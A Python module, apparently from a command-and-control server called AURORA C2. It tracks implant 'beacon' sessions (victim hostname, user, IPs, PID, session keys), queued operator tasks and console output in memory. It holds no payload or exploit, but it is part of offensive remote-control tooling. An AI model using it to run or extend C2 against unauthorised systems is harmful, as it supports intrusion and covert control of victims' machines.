"""
AURORA C2 - Runtime-only beacon and task state.

Beacon sessions and task queues are intentionally kept in memory.
SQLite is only used for operators and event history.
"""
from __future__ import annotations

import uuid

import config
from crypto import now_ts

_beacons: dict[str, dict] = {}
_tasks: dict[str, dict] = {}
_console_lines: dict[str, list[dict]] = {}
_console_seq = 0
_SERVER_STARTED_AT = now_ts()


def get_server_started_at() -> float:
    return _SERVER_STARTED_AT


def _beacon_status(last_seen: float) -> str:
    return "dead" if (now_ts() - last_seen) > config.BEACON_TIMEOUT else "active"


def upsert_beacon_session(bid, hostname, username, os_name, arch, ip, pid, external_ip=None, session_key: bytes | None = None, listener_id: str = "default") -> bool:
    """Insert/update an in-memory beacon session. Returns True if first seen or re-online."""
    now = now_ts()
    existing = _beacons.get(bid)
    if existing:
        should_emit_online = _beacon_status(existing.get("last_seen", 0)) == "dead"
        existing.update({
            "hostname": hostname,
            "username": username,
            "os": os_name,
            "arch": arch,
            "ip": ip,
            "internal_ip": ip,
            "external_ip": external_ip or "-",
            "pid": pid,
            "listener_id": listener_id,
            "last_seen": now,
            "status": "active",
        })
        if session_key:
            existing["session_key"] = session_key
        return should_emit_online

    _beacons[bid] = {
        "id": bid,
        "hostname": hostname,
        "username": username,
        "os": os_name,
        "arch": arch,
        "ip": ip,
        "internal_ip": ip,
        "external_ip": external_ip or "-",
        "pid": pid,
        "listener_id": listener_id,
        "first_seen": now,
        "last_seen": now,
        "status": "active",
        "sleep_interval": config.DEFAULT_SLEEP,
        "jitter": config.DEFAULT_JITTER,
        "session_key": session_key,
    }
    return True


def update_beacon_session_seen(bid: str) -> bool:
    b = _beacons.get(bid)
    if not b:
        return False
    b["last_seen"] = now_ts()
    b["status"] = "active"
    return True


def get_beacon_session(bid: str) -> dict | None:
    b = _beacons.get(bid)
    if not b:
        return None
    out = dict(b)
    out["status"] = _beacon_status(out["last_seen"])
    out.pop("session_key", None)
    return out


def get_beacon_session_key(bid: str) -> bytes | None:
    b = _beacons.get(bid)
    return b.get("session_key") if b else None


def set_beacon_session_key(bid: str, session_key: bytes) -> None:
    b = _beacons.get(bid)
    if b:
        b["session_key"] = session_key


def list_beacon_sessions() -> list[dict]:
    beacons = []
    for b in _beacons.values():
        out = dict(b)
        out["status"] = _beacon_status(out["last_seen"])
        out.pop("session_key", None)
        b["status"] = out["status"]
        beacons.append(out)
    return sorted(beacons, key=lambda x: x.get("first_seen", x.get("last_seen", 0)))


def delete_beacon_session(bid: str) -> None:
    _beacons.pop(bid, None)
    delete_task_sessions_for_beacon(bid)
    _console_lines.pop(bid, None)


def append_console_line(beacon_id: str, cls: str, text: str, task_id: str | None = None, kind: str | None = None) -> dict:
    global _console_seq
    _console_seq += 1
    line = {
        "seq": _console_seq,
        "beacon_id": beacon_id,
        "cls": cls,
        "text": text,
        "task_id": task_id,
        "kind": kind,
        "created_at": now_ts(),
    }
    lines = _console_lines.setdefault(beacon_id, [])
    lines.append(line)
    if len(lines) > 500:
        del lines[:-500]
    return dict(line)


def list_console_lines(beacon_id: str) -> list[dict]:
    return [dict(line) for line in _console_lines.get(beacon_id, [])]


def update_console_pending(task_id: str, text: str) -> None:
    for lines in _console_lines.values():
        for line in lines:
            if line.get("task_id") == task_id and line.get("kind") == "pending":
                line["text"] = text
                return


def complete_console_task(task_id: str, cls: str, text: str) -> None:
    if cls == "success":
        cls = "result"
    task = _tasks.get(task_id)
    beacon_id = task.get("beacon_id") if task else ""
    for lines in _console_lines.values():
        for line in lines:
            if line.get("task_id") == task_id and line.get("kind") in ("pending", "result"):
                line["cls"] = cls
                line["text"] = text
                line["kind"] = "result"
                return
    if beacon_id:
        append_console_line(beacon_id, cls, text, task_id=task_id, kind="result")


def create_task_session(
    beacon_id: str,
    command: str,
    args: str,
    display_args: str | None = None,
    meta: dict | None = None,
) -> str:
    tid = uuid.uuid4().hex[:12]
    _tasks[tid] = {
        "id": tid,
        "beacon_id": beacon_id,
        "command": command,
        "args": args,
        "display_args": display_args if display_args is not None else args,
        "meta": meta or {},
        "status": "pending",
        "result": None,
        "created_at": now_ts(),
        "completed_at": None,
    }
    return tid


def list_task_sessions(beacon_id: str) -> list[dict]:
    tasks = []
    for task in _tasks.values():
        if task["beacon_id"] != beacon_id:
            continue
        if task.get("meta", {}).get("source") in ("filebrowser", "proclist"):
            continue
        out = dict(task)
        out["args"] = task.get("display_args", task["args"])
        out.pop("meta", None)
        tasks.append(out)
    return sorted(tasks, key=lambda x: x["created_at"])[-200:]


def get_pending_task_sessions(beacon_id: str, limit: int = 5) -> list[dict]:
    tasks = [
        dict(t) for t in _tasks.values()
        if t["beacon_id"] == beacon_id and t["status"] == "pending"
    ]
    return sorted(tasks, key=lambda x: x["created_at"])[:limit]


def get_task_session(task_id: str) -> dict | None:
    task = _tasks.get(task_id)
    return dict(task) if task else None


def mark_task_session_sent(task_id: str) -> None:
    task = _tasks.get(task_id)
    if task:
        task["status"] = "sent"


def complete_task_session(task_id: str, status: str, result: str) -> None:
    task = _tasks.get(task_id)
    if task:
        task["status"] = status
        task["result"] = result
        task["completed_at"] = now_ts()


def delete_task_sessions_for_beacon(beacon_id: str) -> None:
    for tid in [tid for tid, task in _tasks.items() if task["beacon_id"] == beacon_id]:
        _tasks.pop(tid, None)
